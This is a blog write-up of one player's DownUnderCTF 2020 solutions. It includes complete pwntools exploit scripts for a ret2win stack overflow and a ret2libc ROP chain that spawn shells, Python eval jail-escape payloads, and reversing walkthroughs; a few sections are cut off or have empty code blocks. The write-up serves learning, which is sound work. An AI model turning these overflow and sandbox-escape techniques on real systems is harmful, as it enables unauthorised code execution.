This last weekend (more like Friday and Saturday, really) I participated in [DownUnderCTF 2020](https://downunderctf.com/) along with [CaptureTheFrancesinha](https://ctftime.org/team/111459), the CTF team of my student branch and the one I'm currently more engaged with. We managed to place 146th out of 1080 scoring teams worldwide, which was quite a great achievement! Our team scored 2130 points and I was the largest scorer (humble brag lol) with 1510.

These were the challenges I solved, whose solutions I will detail in this blog post:

![Solves](./images/ductf2020/solves.png)

For this CTF I started by focusing on the `pwn` challenges due to recently having learned much more about binary exploitation and wanting to test out my newly found skills!
This paid off as some techniques I had learned were useful for this CTF and I also had the right direction in some other challenges I was unable to solve (whose writeups I'll need to check out later!).

Later on, once I declared myself "stuck" on the remaining `pwn` challenges, I took a broad look at the rest of the categories and picked some that looked the simplest / most interesting to work on.
Several of them were too tricky for me (for example the crypto ones that my team hadn't solved - way too much math for me) but I still managed to get some more solves as the clocked ticked down!

The recently found knowledge was also applicable to some of the reversing challenges - this was based more on dynamic analysis of the software than exploiting it with buffer overflows per se.
However, the knowledge gained when trying to exploit programs for the typical buffer overflow vulnerabilities of program flow and understanding some assembly snippets also was very useful for this category!

Funny thing to start this off: I hadn't even noticed that the source code was provided. I just dropped the binary into ghidra and looked at it like that.

From the title, I thought this would be a challenge where we would Buffer Overflow into our own shellcode. When looking at the source code (or ghidra as I did at the time) we can understand that the solution is much simpler:

```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}

int main(void) {
    printf("Welcome! Can you figure out how to get this program to give you a shell?\n");
    vuln();
    printf("Unfortunately, you did not win. Please try again another time!\n");
}
```

Hmmmmm, a `gets` call and a function that doesn't get called which spawns a shell? ðŸ¤”ðŸ¤”
This program is ripe for exploitation! Let's do a buffer overflow to overwrite the return address to go to the `get_shell` function!

```python
# exploit.py
from pwn import *
# 64 bit, NX set

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.binary = elf = ELF('./shellthis')

def conn():
    if args.REMOTE:
        return remote("chal.duc.tf", 30002)
    else:
        return process()


r = conn()
if not args.REMOTE and not args.NO_GDB:
    gdb.attach(r)
    pass

# Detecting EIP overrun
# payload = cyclic(1024)
# eip_offset = cyclic_find(0x6161616f)
eip_offset = 56

payload = flat(
    b'A'*eip_offset,
    elf.sym['get_shell']
)

r.recvline()
r.sendline(payload)

print(r.clean())
r.interactive()

r.close()
```

Initially, I detected the padding that would be necessary by sending a [De Brujin sequence (the linked post explains its usefulness for binary exploitation quite well)](https://ironstone.gitbook.io/notes/types/stack/de-bruijn-sequences) and using the attached GDB session to know the value that EIP would have when returning (when it `SEGFAULT`ed due to returning to our payload).

Afterwards we only need to send the padding and then overwrite the return address with the value of the `get_shell` function. Then we get a shell and just need to read `flag.txt`:

```

```

The fact that the NX bit was set (the stack is not executable) would also be a good way to stop thinking about shellcode and just use what is already provided! These kinds of challenges are usually known as `ret2win` since we only need to return into a "win" function.

## Return to what (pwn) - 200 points {#Return-to-what}

Given the task name I really suspected [ROP (Return-Oriented Programming)](https://en.wikipedia.org/wiki/Return-oriented_programming) would be necessary for this one. It seems like I was right :)
The given binary is 64bit and has NX enabled (thus removing the possibility of using shellcode straight away).

After checking the gadgets via `pwntools` and concluding that there weren't many, I started thinking about ret2libc (kind of a variation of ROP in which after knowing the libc adresses we ROP into its functions - being able to execute things like `system` or `execve` to get a shell).

Thus, I had my plan: I would ROP into the PLT entry of `puts` to call it and leak GOT addresses of libc functions in order to identify the correct libc version (using [libc.blukat.me](https://libc.blukat.me/)).
After knowing this, we can use [`pwninit`](https://github.com/io12/pwninit) to get a compatible linker to run the program and continue developing our exploit.
Now, we just need to leak the address of a libc function from the GOT again in order to know the libc base address (I'm assuming ASLR is enabled on the remote machine). Then, we can use that to ret2libc and get our shell!

```python
# exploit.py
from pwn import *
# 64 bit, NX set

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.binary = elf = ELF('./return-to-what')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
ld = ELF('./ld-2.27.so')


def conn():
    if args.REMOTE:
        return remote("chal.duc.tf", 30003)
    else:
        return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
        # return process()


r = conn()
if not args.REMOTE and not args.NO_GDB:
    gdb.attach(r)
    pass

# Detecting EIP overrun
# payload = cyclic(1024)
# eip_offset = cyclic_find(0x6161616f)
eip_offset = 56

rop = ROP(elf)
rop.raw(b'A'*eip_offset)
rop.puts(elf.got['puts'])
rop.puts(elf.got['__libc_start_main'])
rop.vuln()

payload = rop.chain()

# Main has 2 messages, the "Today, we'll have a lesson in returns." and "Where would you like to return to?"
r.recvline()
r.recvline()

r.sendline(payload)

puts_leak_raw_data = r.recvline().rstrip()
print(puts_leak_raw_data)
# Concatenating two NUL bytes that `puts` probably "ate"
puts_leak = u64(puts_leak_raw_data + b'\x00\x00')
print(f"'puts' at {hex(puts_leak)}")

libc_start_main_leak_raw_data = r.recvline().rstrip()
print(libc_start_main_leak_raw_data)
libc_start_main_leak = u64(libc_start_main_leak_raw_data + b'\x00\x00')
print(f"'libc_start_main' at {hex(libc_start_main_leak)}")

# Confirmed via GDB but now have to confirm correct libc version via leaking the address of some functions
libc_base = puts_leak - libc.sym['puts']
libc.address = libc_base
print(f"Libc at {hex(libc.address)}")

# Clearing vuln's messages again since we returned to it
print(r.recvline())

# Don't forget to set the libc base address before creating the ROP object
libc_rop = ROP(libc)
binsh = next(libc.search(b'/bin/sh\x00'))
libc_rop.system(binsh)

payload = b'A'*eip_offset + libc_rop.chain()
r.sendline(payload)

print(r.clean())
r.interactive()

r.close()

```

[The libc version we got from the remote leak.](https://libc.blukat.me/?q=__libc_start_main%3Aab0%2Cputs%3A9c0)

The exploit code speaks for itself. I used `pwntools`'s ROP module to simplify the ROP exploit development significantly (due to the CTF being a time-restricted event) but I encourage whoever's learning about this technique to also do it "manually" by constructing the payloads yourselves. I did that in several other occasions and can confirm that it's a good way to better understand what goes on behind the scenes.

## Addition (misc) - 200 points {#Addition}

> Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project is a simple calculator which he reckons is super secure because of the "filters" he has in place. However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag.

After opening the link, we reach a simple web page with the title "Joe's Supreme calculator":

![Joe's Supreme calculator webpage](./images/ductf2020/joe-supreme-calculator.png)

After trying some calculations, I tried inputting hexadecimal numbers which were promptly converted into their decimal values.
This is a behaviour I recall being common with a python REPL! So I started targeting a python "jail".
One of my first successful attempts was `dir()` which showed some accessible variables.

I then started thinking of possible protections that were in place.
One of the simplest (that was the case in [FWordCTF2020's Directory Manager (Misc) challenge](/blog/fwordctf-2020-writeup#Directory-Manager)) is to simply blacklist a certain set of methods and modules that could be used by an attacker to reach the flag. A very simple workaround, and also the intended one for the mentioned challenge was to simply use string concatenation.

As such, I tried snooping around the program's global variables with `eval('glo'+'bals()')` (I prettified the output a lot, it was just a string without newlines in the website):

From all this, we can highlight a couple things - the flag in the `maybe_this_maybe_not` variable, and the blacklist for the program's input in the `blacklist` variable.
After submitting the flag I took to leaking the program's source code, just for the heck of it (via `eval('o'+'pen(__file__).read()')`):

```

So that makes it clear exactly how we could work around the restrictions in place! The flag is `DUCTF{3v4L_1s_D4ng3r0u5}`, and it can be reached directly with something as simple as typing in the variable name, now that we know it:

The description and previous challenges I did in other CTFs made me "guess" the solution straight away - [SSTV](https://en.wikipedia.org/wiki/Slow-scan_television)!

Thus, using the [typical article](https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04), it was simple to decode it:

![Decoded image](./images/ductf2020/decoded_tim_tams.png)

I initially tried the Robot36 app for Android, but some noise was getting picked up right at the beginning, which made the flag incomprehensible, sadly:

!["Bad" image via Robot36](./images/ductf2020/failed_mobile_tim_tams.png)

The text on the image was `QHPGS{UHZOYR_Z3Z3_1BEQ}`, which after ROT13 resulted in `DUCTF{HUMBLE_M3M3_1ORD}`.

From the name I also had a good hunch for what the solution of this challenge would be. I booted up audacity, opened the file and switched to spectrogram view:


![Audacity Spectrogram View](./images/ductf2020/on-the-spectrum.png)

Bingo! The flag is `DUCTF{m4by3_n0t_s0_h1dd3n}`!

7 directories, 212 files
```

The `.config` directory had a `secret` directory inside of it. In it, there were other directories numbered 1 thru 40, each with .txt files also with names 1 thru 40.
Certainly one of these must be different! Using `find . -type f -exec cat {} \;` we can see that the files have kind of random strings, and one stands out as being much smaller than the rest.
This file's contents were `CjEyMzRJc0FTZWN1cmVQYXNzd29yZA==` which after base64 decoding results in `1234IsASecurePassword`.

Given the challenge description mentioning `steghide`, this is likely the password to extracting the file in the "secret" image.

Only after reaching this point did I remember to take a look at `Reminder.png` (I'm a CLI guy, kind of forget about visual things like images apparently).
Despite the extension, the file was being identified as a zip file by `file`, and `feh` would not open the image.
I opened up the image in `hexeditor -b` and confirmed that the magic bytes were wrong... But only the first 4! The following 4 were correct according to the PNG spec.
As such, this seemed intentional. After correcting this, the image would now open correctly:

![Reminder.png](./images/ductf2020/Reminder.png)

So this confirms we are going in the right direction! Sadly this does not provide any new information, though.

Now that we have a password, we only need to find the right file to decode things from!
The bunch of `jpg`s in `badfiles/` seems like a good place to hide something, especially since the files all look very similar, like colored static.
Well, nothing like trying every single one of them with a bash one-liner:

```

And there we have it! We extracted a text file from the image, and it contained the flag!

## Formatting (reversing) - 100 points {#Formatting}

> Its really easy, I promise
> 
> Files: formatting

After using `ghidra` to start disassembling the binary, I noticed that the flag's value was written directly to the buffer.

```c
undefined8 main(void)
{
  int iVar1;
  char buf [17];
  undefined left_curly;
  undefined nul;
  long local_28;
  undefined4 l;
  undefined4 f;

  f = 0x66;
  l = 0x6c;
  nul = 0;
  left_curly = (undefined)brac1;
  iVar1 = sprintf(buf,fmt,"d1d_You_Just_ltrace_",(ulong)this,(ulong)crap,(ulong)is,(ulong)too,
                  (ulong)easy,(ulong)what,(ulong)the,(ulong)heck);
  local_28 = (long)iVar1;
  buf[local_28] = (char)brac1;
  puts(flag + 6);
  return 0;
}
```

As such, dynamic analysis of the program via `gdb` seemed like the easiest option. Just set a breakpoint right at the `puts` call and inspect the stack!
This can be done via `b *main+241` and then `x/s $rsp`:

![Formatting gdb output](./images/ductf2020/formatting-gdb.png)

The flag is `DUCTF{d1d_You_Just_ltrace_296faa2990acbc36}`. The cool gdb interface is [`gef`](https://gef.readthedocs.io/en/master/)

## Added protection (reversing) - 200 points {#Added-protection}

> Author: h4sh5
> 
> This binary has some e^tra added protection on the advanced 64bit shellcode
> 
> Files: added_protection

When reading the challenge description, the `^` in its description said something to me about XOR being used in some way, as the `^` character is a symbol that is frequently used in programming to convey the bitwise XOR operation.
The disassembly via `ghidra` did not help me much at the time:

```c
undefined8 main(void)
{
  ushort *puVar1;
  code *__dest;
  ulong local_10;

  fprintf(stderr,"size of code: %zu\n",0x82);
  local_10 = 0;
  while (local_10 < 0x41) {
    puVar1 = (ushort *)(code + local_10 * 2);
    *puVar1 = *puVar1 ^ 0xbeef;
    if (*puVar1 < 0x2a) {
      *puVar1 = *puVar1 - 0x2b;
    }
    else {
      *puVar1 = *puVar1 - 0x2a;
    }
    local_10 = local_10 + 1;
  }
  __dest = (code *)mmap((void *)0x0,0x82,7,0x22,-1,0);
  if (__dest == (code *)0xffffffffffffffff) {
    perror("mmap");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  memcpy(__dest,code,0x82);
  (*__dest)();
  return 0;
}
```

This seemed to me like something was being obfuscated with the XOR of pointers with constants, and that reversing this would lead to the flag.
However, this was one of the last challenges I solved and it was quite late, with me being super sleepy and being unable to interpret the code correctly.

So, I did what I could think of at the time - resort to dynamic analysis of the code via gdb. I was surprised to see this work!
Basically, what this code is doing is building shellcode that was "obfuscated" (encrypted via a XOR cipher) and then executing it.
Using GDB this code can be inspected and the flag can be found!

I just set a breakpoint in GDB to the `mmap` call and kept stepping through the instructions.
The `(*__dest)()` instruction was decompiled from a `call rdx` that jumped to the "shellcode".

After stepping for a bit and inspecting the stack we can find the flag:

```
gefâž¤  x/s $rsp
0x7fffffffddd4:	"DUCTF{adv4ncedEncrypt3dShellCode}Can u find the flag?   \n"
```

Right after following the `call rdx` instruction we can find the "shellcode" (more like flagcode):
```
gefâž¤  x/30i $pc
=> 0x7ffff7fc9000:	sub    rsp,0x64
   0x7ffff7fc9004:	mov    rcx,rsp

   0x7ffff7fc9063:	mov    eax,0x1
   0x7ffff7fc9068:	mov    edi,0x1
   0x7ffff7fc906d:	lea    rsi,[rcx-0x1f]
   0x7ffff7fc9071:	mov    edx,0x3a
   0x7ffff7fc9076:	syscall
   0x7ffff7fc9078:	xor    rbx,rbx
   0x7ffff7fc907b:	mov    eax,0x3c
   0x7ffff7fc9080:	syscall
   0x7ffff7fc9082:	add    BYTE PTR [rax],al
   0x7ffff7fc9084:	add    BYTE PTR [rax],al
   0x7ffff7fc9086:	add    BYTE PTR [rax],al
   0x7ffff7fc9088:	add    BYTE PTR [rax],al
```

Space is allocated in the stack for the flag's value, creating a buffer that will be used for it.
Then, values are moved to registers and then pushed to the stack. This is the flag's value (and where it was possible to find it via the example above).

Finally, two syscalls are executed. The first one has the EAX value 1, thus being `write`. This prints out the output we see when running the program normally: "Can u find the flag?".
The second one has the value `0x3c`, 60 in decimal. Using [this table of x86-64 syscalls](https://filippo.io/linux-syscall-table/) we can confirm that it is an `exit` syscall.
This makes the program exit cleanly. As such we can disregard the next part, as it's probably uninitialized memory.

One might think "if the `write` syscall is called with the buffer as argument, how come the flag isn't printed?". Well, if we take a look at the `lea` instruction that was in address `0x7ffff7fc906d` in the snippet above, we can see that `rsi`, the `write` syscall's second argument (the buffer to use), is loaded with an offset of `rcx`'s address. In the second instruction in the snippet `rcx` will be pointing at the stack, in the base of the buffer (since it was set before the `push`es). As such, the buffer address was offset by `0x1f` (31) characters, which is more or less the length of the flag (33). I probably missed some alignment here, but the I think this explains the gist of it - `rsi` will point at the buffer, yes, but a bit after the flag so that it isn't printed!

## Survey (survey) - 10 points {#Survey}

> The organising team have put a lot of effort and love into making DUCTF. We would really appreciate your honest feedback!
> 
> https://duc.tf/feedback

This seemed like a simple feedback survey, but was in fact the most difficult challenge in the whole CTF!
Luckily I managed to complete it with some time to spare, otherwise we would've missed out on these 10 points! ðŸ˜›

## Sign-off

Overall, this was a very fun CTF, that seemed to be broad in its scope - not only in terms of having varied categories of challenges, but also in terms of difficulty.
It really felt like there was something for everyone, which is always nice to see in CTFs like this.

I would have liked to have taken a shot at the OSINT challenges, as normally these are very creative and fun to do.
However, since they might have me going down a rabbit hole to do something and I might get stuck after having spent a lot of time, I chose to play on my "strengths" instead of taking more risks and went for other categories first.

Unfortunately, I also did not have much time to dedicate to the CTF, hence not even having tried any Web challenge, for example, which was something that could maybe be accessible with my knowledge level.
Additionally, I was sad to only have picked up the Reversing challenges so late given that they were kind of easy (the ones I managed to solve, no clue about the other ones ðŸ˜›) and might have motivated me to try a bit harder on other challenges I got stuck on.

All in all, this was a very positive experience, once again highlighting the educational value of CTFs in not only being able to test concepts you already know (in my case my recently-acquired `pwn` basics knowledge) and also learn new things!

I hope you enjoyed reading about these challenges, much like I enjoyed solving them.<br/>
And as always: thanks for reading!
